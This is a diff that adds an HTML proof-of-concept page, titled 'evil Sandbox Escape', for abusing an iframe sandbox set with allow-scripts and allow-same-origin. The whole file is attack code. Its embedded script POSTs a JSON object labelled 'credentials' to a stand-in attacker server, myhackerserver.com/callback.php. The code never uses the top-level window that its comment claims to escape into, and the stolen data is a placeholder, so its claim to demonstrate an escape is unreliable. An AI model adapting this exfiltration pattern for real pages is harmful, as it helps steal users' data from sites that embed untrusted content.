@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>evil Sandbox Escape</title>
+</head>
+<body>
+    <h1>Sandbox Escape PoC</h1>
+    <iframe srcdoc="
+        <script>
+            // Escape the sandbox by using top-level window context due to allow-same-origin
+            var payload = {
+                data: 'credentials'
+            };
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://myhackerserver.com/callback.php', true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.onreadystatechange = function() {
+                if(xhr.readyState == 4 && xhr.status == 200) {
+                    alert('Data sent: ' + JSON.stringify(payload));
+                }
+            }
+            xhr.send(JSON.stringify(payload));
+        </script>
+        <p>If script runs, data has been sent.</p>
+    " sandbox="allow-scripts allow-same-origin"></iframe>
+</body>
+</html>
